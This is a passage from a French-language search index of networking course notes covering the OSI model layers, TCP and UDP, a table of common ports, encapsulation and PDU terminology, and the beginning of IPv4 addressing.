\u00e9mettrice ainsi que celui de l\u2019application r\u00e9ceptrice. Elle fragmente les donn\u00e9es en plusieurs s\u00e9quences (ou segments).</p> <ul> <li>Communication entre m\u00eames types applications (ports)</li> <li>contr\u00f4le de flux (segmentation et r\u00e9duction de l\u2019encombrement)</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/#3-reseau","title":"3- R\u00e9seau","text":"<p>Couche R\u00e9seau Connexion logique entre les h\u00f4tes. Elle traite de tout ce qui concerne l\u2019identification et le routage dans le r\u00e9seau.</p> <ul> <li>Communication entre les PC exp\u00e9diteurs et destinataires</li> <li>Choix de la meilleure route (routage)</li> <li>Adressage logique (Adresses IPv4 et IPv6)</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/#2-liaison-de-donnees","title":"2- Liaison de donn\u00e9es","text":"<p>Couche Liaison de donn\u00e9es \u00c9tablissement d\u2019une liaison physique entre les h\u00f4tes (Point \u00e0 point). Elle fragmente les donn\u00e9es en plusieurs trames.</p> <ul> <li>Communication entre noeuds adjacents</li> <li>Contr\u00f4le d\u2019erreurs et de flux</li> <li>Adressage physique (adresse MAC)</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/#1-physique","title":"1- Physique","text":"<p>Couche Physique Transmission du signal</p> <ul> <li>Conversion des trames en bits,</li> <li>Transmission physique des donn\u00e9es sur le m\u00e9dia (Modulation).</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/#processus-de-transmissionreception","title":"Processus de Transmission/R\u00e9ception","text":"<p>Quand un h\u00f4te A envoi vers un h\u00f4te B, le processus d\u2019envoi va de la couche\u00a0:</p> <p>Modele OSI</p> <pre>\n    classDiagram\n    class Couche{\n    Couche : Application\n    Couche : Pr\u00e9sentation\n    Couche : Session\n    Couche : Transport\n    Couche : R\u00e9seau\n    Couche : Liaison\n    Couche : Physique\n    }\n</pre>"},{"location":"Reseaux/Module-Couche_OSI/#osi-vs-tcpip","title":"OSI vs TCP/IP","text":"<ul> <li> <p>Le mod\u00e8le OSI a \u00e9t\u00e9 d\u00e9velopp\u00e9 \u00e0 vocation normative. C\u2019est-\u00e0-dire qu\u2019il r\u00e9f\u00e9rence le d\u00e9roulement de la communication entre 2\u00a0h\u00f4tes.</p> </li> <li> <p>Le mod\u00e8le TCP/IP \u00e0 lui \u00e9t\u00e9 d\u00e9velopp\u00e9 dans un but descriptif. C\u2019est-\u00e0-dire qu\u2019il d\u00e9crit la fa\u00e7on dont se passe la communication en 2\u00a0h\u00f4tes.</p> </li> </ul> <p>En d\u2019autres termes</p> <ul> <li>TCP/IP\u00a0: si vous voulez comprendre comment se d\u00e9roule la communication \u00ab\u00a0sur le terrain\u00a0\u00bb.</li> <li>OSI\u00a0: si vous voulez la suite logique et la proc\u00e9dure selon la norme.</li> </ul> <p></p> <p>Le mod\u00e8le OSI servira de \u00ab\u00a0plan\u00a0\u00bb pour la cr\u00e9ation d\u2019un protocole ou d\u2019un mat\u00e9riel r\u00e9seau</p>"},{"location":"Reseaux/Module-Couche_OSI/#les-ports-et-protocoles","title":"Les Ports et Protocoles","text":""},{"location":"Reseaux/Module-Couche_OSI/#la-notion-de-protocole","title":"La notion de protocole","text":"<p>Selon la d\u00e9finition un protocole est \"un ensemble de r\u00e8gles d\u00e9finissant le mode de communication entre deux ordinateurs\" En reseaux, un protocole est un ensemble de r\u00e8gles permettant de formater et de traiter les donn\u00e9es. Il s'agit d'un langage commun pour les ordinateurs. l'utilisation de protocoles leurs permet de communiquer m\u00eame si ils utilisent des logiciels ou du mat\u00e9riels diff\u00e9rents.  </p> <p>Ci dessous en tableau reprenant les differents protocole et ports utilis\u00e9 par le mod\u00e8le OSI.  </p> <p></p>"},{"location":"Reseaux/Module-Couche_OSI/#la-notion-de-port","title":"La notion de port","text":"<p>Un port est une adresse d'application sur une machine.  </p> <p>La plupart des machines (serveur ou client) ont des ports ouverts.  </p> <p>Un serveur web aura, par exemple, le port 80 ouvert cela permettra \u00e0 des personnes de se connecter dessus via ce m\u00eame port 80. Le port 80 sera l'adresse de l'application web.  </p> <p>quand le nom du site \u00e0 joindre sera taper dans un navigateur, celui-ci va automatiquement interroger ce port (80).  </p> <p>visualisation des ports ouverts</p> <p>La mani\u00e8re la plus simple de visualiser les ports ouverts sur une machien est d'utilis\u00e9 la commande <code>netstat</code> sur linux</p> <code>netstat -an</code><code>netstat -anpe</code><code>netstat -antp</code> <p>Permet de visualiser les d\u00e9tails sur le PID, l'utilisateur et le processus</p> <p>Permet de visualiser uniquement les ports TCP</p>"},{"location":"Reseaux/Module-Couche_OSI/#port-commun","title":"Port Commun","text":"Port TCP UDP Nom Description 1 \u2714 \u2714 tcpmux TCP Port Multiplexer (service de multiplexage de TCP port) 5 \u2714 \u2714 rje Remote Job Entry (saisie de t\u00e2che \u00e0 distance) 7 \u2714 \u2714 echo Service d\u2019\u00e9cho 9 \u2714 \u2714 discard Service z\u00e9ro \u00e0 des fins de test 11 \u2714 \u2714 systat Informations syst\u00e8me 13 \u2714 \u2714 daytime Saisie de la date et de l\u2019heure 17 \u2714 \u2714 qotd Envoie la citation du jour 18 \u2714 \u2714 msp Transf\u00e8re des SMS 19 \u2714 \u2714 chargen Envoie une s\u00e9quence de caract\u00e8res infinie 20 \u2714 ftp-data Transmission de donn\u00e9es FTP 21 \u2714 \u2714 ftp Connexion FTP 22 \u2714 \u2714 ssh Service Secure Shell 23 \u2714 telnet Service Telnet 25 \u2714 smtp Simple Mail Transfer Protocol (protocole simple de transfert de courrier) 37 \u2714 \u2714 time Protocole temporel lisible par un ordinateur 39 \u2714 \u2714 rlp Resource Location Protocol (protocole de localisation des ressources) 42 \u2714 \u2714 nameserver Service de noms 43 \u2714 nicname Service d\u2019annuaire WHOIS 49 \u2714 \u2714 tacacs Terminal Access Controller Access Control System (protocole d\u2019authentification \u00e0 distance) 50 \u2714 \u2714 re-mail-ck Remote Mail Checking (consultation de messagerie \u00e0 distance) 53 \u2714 \u2714 domain R\u00e9solution de nom par DNS 67 \u2714 bootps Services Bootstrap Protocol 68 \u2714 bootpc Bootstrap Client 69 \u2714 tftp Trivial File Transfer Protocol (protocole simplifi\u00e9 de transfert de fichiers) 70 \u2714 gopher Recherche de document 71 \u2714 genius Protocole Genius 79 \u2714 finger Transmet les coordonn\u00e9es des utilisateurs 80 \u2714 http Hypertext Transfer Protocol (protocole de transfert hypertexte) 81 \u2714 Torpark : Onion-Routing (non officiel - routage en oignon) 82 \u2714 Torpark : Control (non officiel) 88 \u2714 \u2714 kerberos Syst\u00e8me d\u2019authentification de r\u00e9seau 101 \u2714 hostname NIC Host Name (nom d\u2019h\u00f4te NIC) 102 \u2714 Iso-tsap ISO-TSAP-Protocol (protocole ISO TSAP) 105 \u2714 \u2714 csnet-ns Mailbox-Mailserver (serveur de messagerie \u00e9lectronique) 107 \u2714 rtelnet Remote Telnet (Telnet \u00e0 distance) 109 \u2714 pop2 Post Office Protocol v2 (protocole de bureau de poste v2) pour la communication par e-mail 110 \u2714 pop3 Post Office Protocol v3 (protocole de bureau de poste v3) pour la communication par e-mail 111 \u2714 \u2714 sunrpc Protocole RPC pour NFS 113 \u2714 auth Service d\u2019authentification 115 \u2714 sftp Simple File Transfer Protocol (version simplifi\u00e9e de FTP) 117 \u2714 uucp-path Transmission de fichiers entre syst\u00e8mes Unix 119 \u2714 nntp Transmission de fichiers au sein de groupes de discussion 123 \u2714 ntp Service de synchronisation temporelle 137 \u2714 \u2714 netbios-ns Service de noms NETBIOS 138 \u2714 \u2714 netbios-dgm NETBIOS Datagram Service (service de datagramme NETBIOS) 139 \u2714 \u2714 netbios-ssn NETBIOS Session Service (service de session NETBIOS) 143 \u2714 \u2714 imap Internet Message Access Protocol (protocole d\u2019acc\u00e8s aux messages \u00e9lectroniques) pour communication par e-mail 161 \u2714 snmp Simple Network Management Protocol (protocole simple de gestion de r\u00e9seau) 162 \u2714 \u2714 snmptrap Simple Network Management Protocol Trap (Trap de protocole simple de gestion de r\u00e9seau) 177 \u2714 \u2714 xdmcp X Display Manager (gestionnaire d\u2019affichage X) 179 \u2714 bgp Border Gateway Protocol (protocole d\u2019\u00e9change de route) 194 \u2714 \u2714 irc Internet Relay Chat (discussion relay\u00e9e par Internet) 199 \u2714 \u2714 smux SNMP UNIX Multiplexer (service de multiplexage UNIX SNMP) 201 \u2714 \u2714 at-rtmp AppleTalk Routing (routage d\u2019AppleTalk) 209 \u2714 \u2714 qmtp Quick Mail Transfer Protocol (protocole de transfert de courrier rapide) 210 \u2714 \u2714 z39.50 Syst\u00e8me d\u2019informations bibliographiques 213 \u2714 \u2714 ipx Internetwork Packet Exchange 220 \u2714 \u2714 imap3 IMAP v3 pour la communication par e-mail 369 \u2714 \u2714 rpc2portmap Coda Filesystem Portmapper (portmapper de syst\u00e8mes de fichiers Coda) 370 \u2714 \u2714 codaauth2 Coda Filesystem Authentication Service (service d\u2019authentification de syst\u00e8mes de fichiers Coda) 389 \u2714 \u2714 ldap Lightweight Directory Access Protocol (protocole DAP version all\u00e9g\u00e9e) 427 \u2714 \u2714 svrloc Service Location Protocol (protocole de d\u00e9couverte de services) 443 \u2714 https HTTPS (HTTP via SSL/TLS) 444 \u2714 \u2714 snpp Simple Network Paging Protocol (protocole simple d\u2019appel de r\u00e9seau) 445 \u2714 microsoft-ds SMB via TCP/IP 464 \u2714 \u2714 kpasswd Modification de mot de passe pour Kerberos 500 \u2714 isakmp Protocole de s\u00e9curit\u00e9 512 \u2714 exec Remote Process Execution (ex\u00e9cution de processus \u00e0 distance) 512 \u2714 comsat/biff Client et serveur de messagerie 513 \u2714 login Connexion \u00e0 l\u2019ordinateur \u00e0 distance 513 \u2714 who Whod User Logging Daemon 514 \u2714 shell Remote Shell 514 \u2714 syslog Unix System Logging Service (service de connexion au syst\u00e8me Unix) 515 \u2714 printer Services d\u2019impression : Line Printer Daemon 517 \u2714 talk Talk Remote Calling (appel \u00e0 distance) 518 \u2714 ntalk Network Talk (discussion en r\u00e9seau) 520 \u2714 efs Extended Filename Server (serveur de noms de fichiers \u00e9tendu) 520 \u2714 router Routing Information Protocol (protocole d\u2019information de routage) 521 \u2714 ripng Routing Information Protocol (protocole d\u2019information de routage) pour IPv6 525 \u2714 timed Serveur de temps 530 \u2714 \u2714 courier Courier Remote Procedure Call (appel de proc\u00e9dure \u00e0 distance Courier) 531 \u2714 \u2714 conference Discussion via AIM et IRC 532 \u2714 netnews Netnews Newsgroup Service (service d\u2019actualit\u00e9s Netnews) 533 \u2714 netwall Diffusions d\u2019urgence 540 \u2714 uucp Unix-to-Unix Copy Protocol (protocole de copie Unix vers Unix) 543 \u2714 klogin Kerberos v5 Remote Login (connexion \u00e0 distance Kerberos v5) 544 \u2714 kshell Kerberos v5 Remote Shell (Shell \u00e0 distance Kerberos v5) 546 \u2714 \u2714 dhcpv6-client DHCP v6 Client 547 \u2714 \u2714 dhcpv6-server DHCP v6 Server 548 \u2714 afpovertcp Apple Filing Protocol (protocole AppleShare) via TCP 554 \u2714 \u2714 rtsp Commande de flux 556 \u2714 remotefs Remote Filesystem (syst\u00e8me de fichiers \u00e0 distance) 563 \u2714 \u2714 nntps NNTP via SSL/TLS 587 \u2714 submission Message Submission Agent (agent de soumission de message) 631 \u2714 \u2714 ipp Internet Printing Protocol (protocole d\u2019impression internet) 631 \u2714 \u2714 Common Unix Printing System (non officiel - syst\u00e8me d\u2019impression Unix commun) 636 \u2714 \u2714 ldaps LDAP via SSL/TLS 674 \u2714 acap Application Configuration Access Protocol (protocole d\u2019acc\u00e8s \u00e0 la configuration d\u2019applications) 694 \u2714 \u2714 ha-cluster Service Heartbeat 749 \u2714 \u2714 kerberos-adm Administration Kerberos v5 750 \u2714 kerberos-iv Services Kerberos v4 873 \u2714 rsync Services de transfert de fichiers rsync 992 \u2714 \u2714 telnets Telnet via SSL/TLS 993 \u2714 imaps IMAP via SSL/TLS 995 \u2714 pop3s POP3 via SSL/TLS Registered Ports Port TCP UDP Nom Description 1080 \u2714 socks Proxy SOCKS 1433 \u2714 ms-sql-s Serveur Microsoft SQL 1434 \u2714 \u2714 ms-sql-m Moniteur Microsoft SQL 1494 \u2714 ica Client Citrix ICA 1512 \u2714 \u2714 wins Windows Internet Name Service 1524 \u2714 \u2714 ingreslock Ingres DBMS 1701 \u2714 l2tp Protocole de tunnelisation de niveau 2/transfert de couche 2 1719 \u2714 h323gatestat H.323 1720 \u2714 h323hostcall H.323 1812 \u2714 \u2714 radius Authentification RADIUS 1813 \u2714 \u2714 radius-acct Acc\u00e8s RADIUS 1985 \u2714 hsrp Cisco HSRP 2008 \u2714 Teamspeak 3 Accounting (non officiel) 2010 \u2714 Teamspeak 3 Weblist (non officiel) 2049 \u2714 \u2714 nfs Syst\u00e8me de fichiers en r\u00e9seau 2102 \u2714 \u2714 zephyr-srv Serveur Zephyr 2103 \u2714 \u2714 zephyr-clt Client Zephyr 2104 \u2714 \u2714 zephyr-hm Gestionnaire d\u2019h\u00f4te Zephyr 2401 \u2714 cvspserver Concurrent Versions System (syst\u00e8me de gestion de versions) 2809 \u2714 \u2714 corbaloc Common Object Request Broker Architecture (architecture logicielle pour le d\u00e9veloppement de composants et d\u2019object requests) 3306 \u2714 \u2714 mysql Service de base de donn\u00e9es MySQL (pour MariaDB \u00e9galement) 4321 \u2714 rwhois Remote Whois Service (service Whois \u00e0 distance) 5999 \u2714 cvsup CVSup 6000 \u2714 X11 X Windows System Services (services syst\u00e8me pour Windows X) 11371 \u2714 pgpkeyserver Serveur de cl\u00e9s publiques pour PGP 13720 \u2714 \u2714 bprd Symantec/Veritas NetBackup 13721 \u2714 \u2714 bpdbm Symantec/Veritas Database Manager 13724 \u2714 \u2714 vnetd Symantec/Veritas Network Utility 13782 \u2714 \u2714 bpcd Symantec/Veritas NetBackup 13783 \u2714 \u2714 vopied Symantec/Veritas VOPIE 22273 \u2714 \u2714 wnn6 Conversion Kana/Kanji 23399 Skype (non officiel) 25565 \u2714 Minecraft 26000 \u2714 \u2714 quake Quake et autres jeux multijoueurs 27017 MongoDB 33434 \u2714 \u2714 traceroute Suivi de r\u00e9seau"},{"location":"Reseaux/Module-Couche_OSI/1_Couche_Physique/","title":"Couche Physique","text":"<p>Le mail est maintenant format\u00e9 et pr\u00eat \u00e0 l\u2019envoi, il faut maintenant le mettre sur le m\u00e9dia.</p> <p>La couche <code>Physique</code>re\u00e7oit les trames de la couche liaison et les convertit en succession de bits qui seront ensuite envoy\u00e9s sur le m\u00e9dia.</p> <p>Cette couche transmet donc les bits en signaux \u00e9lectriques ou optiques.</p> <p>On y trouve des services tels que\u00a0:</p> <ul> <li>D\u00e9tection de collisions</li> <li>Multiplexing</li> <li>Modulation</li> <li>Circuit Switching -\u2026</li> </ul> <p>Unit\u00e9s de la couche Physique</p> <ul> <li>bit</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/1_Couche_Physique/#moyen-de-transmission","title":"Moyen de Transmission","text":"<p>La connexion est effectu\u00e9 via la carte r\u00e9seau  </p> <ul> <li>La carte r\u00e9seau est pr\u00e9sente sur les couches 1 &amp; 2 du mod\u00e8le OSI<ul> <li>Couche 1 : connectique et modulation de donn\u00e9es (Transmission des bits en signaux \u00e9lectriques ou optiques)</li> <li>Couche 2 : Adresse Physique (Adresse MAC)</li> </ul> </li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/1_Couche_Physique/#support-de-transmission","title":"Support de Transmission","text":""},{"location":"Reseaux/Module-Couche_OSI/1_Couche_Physique/#cable-cuivre","title":"C\u00e2ble Cuivre","text":"coupe d'un c\u00e2ble cuivre Cablage Rj45"},{"location":"Reseaux/Module-Couche_OSI/1_Couche_Physique/#fibre-optique","title":"Fibre Optique","text":"Plan Coupe Fibre Optique Caract\u00e9ristique Fibre Optique Connecteur Fibre Optique"},{"location":"Reseaux/Module-Couche_OSI/2_Couche_Liaison/","title":"Couche Liaison de donn\u00e9es","text":"<ul> <li>Pr\u00e9sentation effectu\u00e9e\u00a0? OK\u00a0!</li> <li>Session \u00e9tablie\u00a0? OK\u00a0!</li> <li>Transport en cours\u00a0? OK\u00a0!</li> <li>Adresses IP pr\u00e9cis\u00e9es\u00a0? OK\u00a0!</li> </ul> <p>Il reste la liaison physique \u00e0 \u00e9tablir entre les 2\u00a0h\u00f4tes.</p> <p>La ou la couche r\u00e9seau \u00e9tabli une liaison logique (elle d\u00e9termine la meilleure route <code>logique</code>\u00e0 utiliser) La couche <code>liaison</code>effectue une liaison physique en assurant, dans certains cas, la correction d\u2019erreurs pouvant survenir dans la couche physique.</p> <p>Elle fragmente les donn\u00e9es en plusieurs trames (envoy\u00e9\u00a01 par 1 dans le r\u00e9seau local).</p> <p>Elle doit g\u00e9rer l\u2019acquittement des trames</p> <p>Protocole utilis\u00e9 sur cette couche</p> <p>\u2013\u00a0Ethernet \u2013\u00a0PPP (Point to Point Protocol) \u2013\u00a0HDLC (High-Level Data Link Control)  </p> <p>Unit\u00e9s de la couche Liaison</p> <ul> <li>trames (frames)  </li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/2_Couche_Liaison/#moyen-de-la-couche-liaison","title":"Moyen de la couche Liaison","text":"<p>Sur la couche liaison c'est l'adresse MAC qui s'occupe de transmettre les informations.  </p> <p>Une adresse MAC est une adresse Unique et Physique, elle est stock\u00e9 dans la carte r\u00e9seau ou une interface r\u00e9seau.  </p> <p>Une adresse MAC est un nombre h\u00e9xad\u00e9cimal \u00e0 12 chiffres sur 6 octets (48 bits)  </p> <ul> <li>les 6 premiers chiffres correspondent \u00e0 l' ID_Constructeur </li> <li>les 6 derniers chiffres correspondant \u00e0 l'ID_P\u00e9riph\u00e9rique </li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/3_Couche_Reseau/","title":"Couche R\u00e9seau","text":"<p>Maintenant que la couche transport \u00e0 indiqu\u00e9 le num\u00e9ro de port \u00e0 utiliser, reste \u00e0 avoir l'adresse IP du r\u00e9cepteur.</p> <p>La couche <code>r\u00e9seau</code> se charge du routage des donn\u00e9es entre le point A et le point B &amp; de l'adressage.</p> <p>Sur cette couche aussi l'en-t\u00eate subit une modification, en plus de l'en-t\u00eate ajout\u00e9 par la couche transport on lui rajoute :</p> <ul> <li>IP source</li> <li>IP destinataire</li> </ul> <p>! Le protocole IP est bien sur le plus utilis\u00e9 a ce niveau !</p> <p>Unit\u00e9s de la couche Physique</p> <ul> <li>paquets</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/4_Couche_Transport/","title":"Couche Transport","text":"<p>Prenons l'exemple d'un envoi de mail  </p> <p>Une fois la session \u00e9tablie, par votre couche session la couche <code>transport</code>prend le relais afin de pr\u00e9parer votre mail pour l\u2019envoi.  </p> <p>Le nom de cette couche est trompeur Elle n\u2019est pas responsable \u00e0 proprement parler du transport des donn\u00e9es, mais elle y contribue \u00e0 l\u2019aide des 3\u00a0derni\u00e8res couches R\u00e9seau, Liaison de donn\u00e9es, Physique.  </p> <p>La couche transport divise les donn\u00e9es en plusieurs segments (ou s\u00e9quences) dans la couche transport de l\u2019h\u00f4te \u00e9metteur et les r\u00e9unit dans la couche transport de l\u2019h\u00f4te r\u00e9cepteur.  </p> <p>Elle choisit (en fonction des contraintes de communication) la meilleure fa\u00e7on d\u2019envoyer une information  </p> <ul> <li>Devrais-je m\u2019assurer que la transmission \u00e0 r\u00e9ussi ou juste envoyer\u00a0?</li> <li>Quel port devrais-je utiliser\u00a0?</li> </ul> <p>La couche transport modifie \u00e9galement l\u2019en-t\u00eate des donn\u00e9es en y ajoutant des informations de port\u00a0:  </p> <ul> <li>Port de destination : Application \u00e0 contacter</li> <li>Port local d'\u00e9coute : Port local al\u00e9atoire ouvert pour la r\u00e9ponse</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/4_Couche_Transport/#les-protocoles-tcp-udp","title":"Les Protocoles TCP &amp; UDP","text":"<p>Les 2 protocoles pr\u00e9sent</p> TCPUDP <p>Transmission Control Protocol - Orient\u00e9 connexion (garantit la transmission de donn\u00e9es) - Fiable (garantit la livraison de paquets est obligatoire)  </p> <p>User Datagram Protocol - Orient\u00e9 non connexion (ne garantit pas la transmission de donn\u00e9es) - non Fiable (ne garantit pas la livraison de paquets : aucune m\u00e9canisme de v\u00e9rification de la perte de paquets) - Principalement utilis\u00e9 pour les applications en temps r\u00e9el (la ou le retard de paquet est mieux g\u00e9r\u00e9 que la perte de paquet)  </p> <p>Unit\u00e9s de la couche Transport</p> <p>\u2013 Segment</p>"},{"location":"Reseaux/Module-Couche_OSI/5_Couche_Session/","title":"Couche Session","text":"<p>Prenons l'exemple d'un envoi de mail</p> <p>Une fois format\u00e9 par la couche sup\u00e9rieur <code>Pr\u00e9sentation</code>, votre mail est pr\u00eat \u00e0 \u00eatre envoy\u00e9. La couche <code>session</code> vas ouvrir une sessions avec le bon Protocole/Port servant \u00e0 l'envoi du mail sur la couche suivante.</p> <p>La couche session s'occupe de :</p> <ul> <li>La gestion des sessions</li> <li>Ouverture</li> <li>Fermeture</li> <li>Restauration (si une session est termin\u00e9e la \"reconnexion\" s'effectuera dans cette couche)</li> <li>Gestions des permissions (quelle application peut faire quoi)</li> </ul> <p>Les protocoles de la couche\u00a05, tels que X.225, d\u00e9terminent comment la communication s\u2019effectuera. Il existe 2\u00a0types de communication\u00a0:</p> <ul> <li>Half Duplex (HDX): Permettant la communication tour par tour</li> <li>Full Duplex (FDX): Permettant la communication en simultan\u00e9</li> <li>Simplex\u00a0: Communication possible dans un sens seulement (ex.\u00a0: TV hertzienne) non repr\u00e9sent\u00e9 dans le sch\u00e9ma ci-dessous</li> </ul> <p></p> <p>Unit\u00e9s de la couche Session</p> <p>\u2013\u00a0SPDU</p>"},{"location":"Reseaux/Module-Couche_OSI/6_Couche_Presentation/","title":"Couche Pr\u00e9sentation","text":"<p>Prenons l\u2019exemple d\u2019un envoi de mail</p> <p>La couche Pr\u00e9sentation sert \u00e0 \u00ab\u00a0formater\u00a0\u00bb votre mail (ou tout autre \u00e9l\u00e9ment envoy\u00e9) Elle s\u2019occupe de l\u2019aspect \u00ab\u00a0visuel\u00a0\u00bb de l\u2019information:</p> <ul> <li>La s\u00e9mantique,</li> <li>La syntaxe,</li> <li>(D\u00e9) Chiffrement</li> <li>(D\u00e9) Compression Par exemple, l\u2019utilisation de WinZip intervient sur cette couche.</li> </ul> <p>Un des services de cette couche est la conversion d\u2019un fichier cod\u00e9 EBCDIC en code ASCII</p> <p>Unit\u00e9s de la couche Pr\u00e9sentation</p> <ul> <li>PPDU</li> <li>Extended Binary Coded Decimal Interchange Code</li> <li>American Standard Code for Information Interchange</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/7_Couche_Applicative/","title":"Couche Applicative","text":"<p>Prenons l'exemple d'un envoi de mail  </p> <p>La couche applicative fait office d'interface pour donner l'acc\u00e8s \u00e0 ces services. Ces services vous permettent notamment:</p> <ul> <li>Transfert de fichiers (FTP...)</li> <li>l'envoi de mail (SMTP...)</li> <li>Etablir une session \u00e0 distance (Telnet/SSH)</li> <li>Visualiser une page web (HTPP/HTTPS)</li> <li>...</li> </ul> <p>Unit\u00e9s de la couche Applicative</p> <p>APDU</p>"},{"location":"Reseaux/Module-Couche_OSI/7_Couche_Applicative/#voyons-la-couche-application-plus-en-detail","title":"Voyons la couche Application plus en d\u00e9tail","text":"<p>La couche application est, en quelques sorte, une couche interface. \"interface\" signifie que cette couche sert de point de contact (ou d'interaction) avec l'utilisateur (IHM) et les services r\u00e9seaux.</p> <ul> <li>ex: navigateur web via HTTP</li> </ul> <p>La couche applicative h\u00e9berge principalement :</p> <ul> <li>API (Application Programming Interface): c\u2019est grosso modo des fonctions permettant de cacher le code source.</li> <li>SERVICES\u00a0:</li> <li>Navigateur Internet,</li> <li>Messagerie,</li> <li>R\u00e9solution Nom de domaine.</li> </ul> <p>Protocole pr\u00e9sent sur cette couche</p> FTP | port = 21HTTP | port = 80 HTTPs |port = 443SMTP | port = 25Telnet <p>File Transfert Protocol = Service de transfert de fichier</p> <p>Hyper Text Tranfert Protocol = Protocole autorisant le transfert de fichiers sur le web</p> <p>Identique au \"HTTP\" mais s\u00e9curis\u00e9 via l'obtention d'un certificat SSL/TLS</p> <p>Simple mail Transfert Protocol</p>"},{"location":"Reseaux/Module-Couche_OSI/Encapsulation/","title":"Encapsulation","text":"<p>L'encapsulation est l'\u00e9quivalent d'une enveloppe pour une lettre manuscrite. Dans notre cas les <code>donn\u00e9es</code> sont envelopp\u00e9es \u00e0 chaque couche et le nom de l'unit\u00e9 de donn\u00e9es n'est rien d'autre que le nom de l'enveloppe.  </p> <p>Les PDU (qui forment l'enveloppe) sont constitu\u00e9 de 2 choses :</p> <ul> <li>la donn\u00e9e en elle meme.</li> <li>compos\u00e9 de la donn\u00e9e initiale (mail...) &amp; des en-t\u00eates des couches pr\u00e9c\u00e9dente,</li> <li>l'en-t\u00eate sp\u00e9cifique \u00e0 la <code>couche</code> ou il se trouve.</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/Encapsulation/#relation-entre-les-couches","title":"Relation entre les couches","text":"<p>Notre couche <code>C+1</code>utilise les services de la couche <code>C</code>.</p> <p>Dans l'image la couche Session utilise les services de la couche transport.</p> <ul> <li>C+1 transmet \u00e0 C une donn\u00e9e appel\u00e9e <code>SDU</code></li> <li>Tant que la couche C n'aura pas encapsul\u00e9 celle-ci elle restera en <code>SDU</code></li> <li>Apres l'encapsulation, effectu\u00e9 par C celle-ci prend le nom de PDU</li> </ul>"},{"location":"Reseaux/Module-Couche_OSI/Encapsulation/#relation-entre-pdu-sdu","title":"Relation entre PDU &amp; SDU","text":"<p>Comme vu pr\u00e9c\u00e9demment le PDU de la couche C est le SDU de la couche C+1 plus son en-t\u00eate (couche C). Ce SDU devient un PDU qu'apr\u00e8s l'encapsulation. La couche C ajoute des informations dans l'en-t\u00eate (Header) et/ou le pied (Trailer) du SDU afin que celui-ci devienne un PDU. Ce PDU deviendra alors le SDU de la couche C-1. Le PDU est donc un SDU encapsul\u00e9 avec un en-t\u00eate</p> <p></p> <p>Sur le sch\u00e9ma suivant tous les \u00e9l\u00e9ments encadr\u00e9s en bleu forment un SDU (comme indiqu\u00e9 sur la l\u00e9gende)</p> <p>Une couche ne connait pas l'existence de l'en-t\u00eate ajout\u00e9 par la couche du dessus (C+1). En fait cette en t\u00eate, via l'encapsulation, devient une partie int\u00e9grante de la donn\u00e9e initiale.</p> <p></p> <p>sur le sch\u00e9ma ci-dessus <code>DF</code>signifie Data link Footer. c'est le trailer ou l'en-queue.</p>"},{"location":"Reseaux/Module-Couche_OSI/Encapsulation/#desencapsulations","title":"D\u00e9sencapsulations","text":"<p>Lors de la D\u00e9sencapsulation, chaque en-t\u00eate ajout\u00e9 durant l\u2019encapsulation sera \u00ab\u00a0supprim\u00e9\u00a0\u00bb au fur et \u00e0 mesure que le message grimpera les couches (voir image suivante)</p> <p></p>"},{"location":"Reseaux/Module-Couche_OSI/Unites_donnees/","title":"Les Unit\u00e9s de donn\u00e9es","text":"<p>Durant la communication entre 2 h\u00f4tes, chaque information transmise est une donn\u00e9e.  </p> <p>Cette <code>donn\u00e9e</code>a plusieurs unit\u00e9s selon la couche travers\u00e9e, il s\u2019agit bien de la m\u00eame donn\u00e9e, mais sous plusieurs appellations.  </p> <p>Les donn\u00e9es transmises sont ainsi appel\u00e9es :  </p> <ul> <li>PDU (Protocol Data Units) : unit\u00e9 de donn\u00e9es du protocole  </li> </ul> Composition d'un PDU <p>Un PDU est compos\u00e9 de : - Un SDU : unit\u00e9 de donn\u00e9es du service n - UN PCI : Information de contr\u00f4le du protocole n (en-t\u00eate)  </p> <p>les PDU \u00e0 travers les couches</p> <p>Au passage de chaque couche le nom PDU sera pr\u00e9c\u00e9d\u00e9 de l'initiale de la couche dont elles vient:  </p> APDUPPDUSPDU <p>Passage de la couche Applicative \u00e0 la couche Pr\u00e9sentation Application Protocol Data Unit</p> <p>Passage de la couche Pr\u00e9sentation \u00e0 la couche Application OU Session Presentation Protocol Data Unit</p> <p>Passage de la couche Session \u00e0 la couche Pr\u00e9sentation Session Protocol Data Units  </p> <p>Une fois dans la couche Transport (petit rappel la couche transport d\u00e9coupe les donn\u00e9es en segment) la logique veut donc que les PDU deviennent donc des\u2026 segments</p> <p>le terme TPDU (Transport Protocol Data Units) est \u00e9galement correcte pour la couche transport</p> <p>Arriv\u00e9 dans les couches\u00a03/2/1, les donn\u00e9es deviennent\u00a0:</p> <ul> <li>R\u00e9seau = paquets</li> <li>Liaison = trames (frames)</li> <li>Physique = bits</li> </ul> <p>Donc si quelqu\u2019un vous dit qu\u2019il a perdu des paquets vous savez que votre probl\u00e8me devrait \u00eatre (normalement) dans la couche r\u00e9seau de votre infrastructure, etc.</p> <p></p> <p>Sur le sch\u00e9ma, la mention <code>Datagram</code>est le nom d\u2019un PDU transmis via un service non fiable (ex.:UDP)</p>"},{"location":"Reseaux/Module_IP/Adressage_IPv4/","title":"Adressage IPv4","text":""},{"location":"Reseaux/Module_IP/Adressage_IPv4/#explication","title":"Explication","text":"<p>Une adresse IPv4 est constitu\u00e9 de :</p> <ul> <li>32 <code>bits</code> d\u00e9coup\u00e9s en 4 nombres.</li> <li>4 nombres correspondant \u00e0 4 octets compris entre 0 &amp; 255.</li> <li>chaque octets est s\u00e9par\u00e9 par des \".\"</li> <li>Un identifiant r\u00e9seau (ID_R\u00e9seau) commun \u00e0 l'ensemble des h\u00f6tes du r\u00e9seau</li> <li>Un identifiant h\u00f4te (ID_H\u00f4tes) unique \u00e0 la machine dans le r\u00e9seau  </li> </ul> <p> </p> <p>Pour reprendre l'adresse IP du tableau : 192.168.1.1</p> l'ID_R\u00e9seaul'ID_H\u00f4te <p>est 192.168.1  